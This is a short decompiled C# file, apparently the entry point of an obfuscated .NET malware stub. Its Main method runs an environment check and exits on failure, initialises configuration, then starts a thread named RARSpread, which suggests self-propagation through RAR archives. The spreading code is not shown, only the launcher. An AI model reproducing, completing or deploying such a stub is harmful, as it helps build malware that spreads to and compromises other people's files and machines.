using System;
using System.Threading;
using Stub;

namespace ns0;

internal class Class4
{
	public static Class11 class11_0 = new Class11();

	public static Class8 class8_0 = new Class8();

	public static Class12 class12_0 = new Class12();

	public static Class16 class16_0 = new Class16();

	private static Class3 class3_0 = new Class3();

	private static Class15 class15_0 = new Class15();

	public static void Main(string[] args)
	{
		if (!class3_0.method_0())
		{
			Environment.Exit(-1);
		}
		class11_0.string_6 = class12_0.method_1();
		class11_0.string_8 = class12_0.method_0();
		class16_0.method_0();
		class15_0.method_0();
		smethod_0();
	}

	private static void smethod_0()
	{
		if (class11_0.bool_0)
		{
			try
			{
				Thread thread = new Thread(cRARSpread.RARSpread);
				thread.Start();
			}
			catch
			{
			}
		}
	}
}
